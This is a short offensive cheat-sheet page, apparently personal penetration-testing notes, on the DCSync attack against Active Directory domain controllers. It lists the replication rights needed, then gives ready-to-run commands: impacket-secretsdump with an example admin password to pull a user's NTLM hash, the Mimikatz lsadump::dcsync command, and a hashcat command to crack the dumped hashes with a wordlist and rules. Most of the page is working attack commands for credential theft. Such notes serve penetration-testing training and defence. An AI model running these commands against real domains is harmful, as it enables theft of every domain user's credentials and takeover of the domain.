# Domain Controller Synchronization

{% hint style="danger" %}
need access to a user that is a member of _Domain Admins_, _Enterprise Admins_, or _Administrators_

* _or Replicating Directory Changes_, _Replicating Directory Changes All_, and _Replicating Directory Changes in Filtered Set_ rights
{% endhint %}

By impersonating a domain controller, we can use replication to obtain any domain user credentials from a domain controller.&#x20;

### Linux

&#x20;Perform a dcsync attack to obtain the NTLM hash of _dave:_

{% code overflow="wrap" %}
```sh
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```
{% endcode %}

* **-just-dc-user**: target user
* **domain/user:password@ip**

### Windows

Perform a dcsync attack to obtain the credentials of _dave:_

{% code title="Mimikatz" %}
```powershell
lsadump::dcsync /user:corp\dave
```
{% endcode %}

* can perform the dcsync attack to obtain any user password hash in the domain, even the domain administrator _Administrator_

### Hash Cracking

{% code overflow="wrap" %}
```shell
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
{% endcode %}
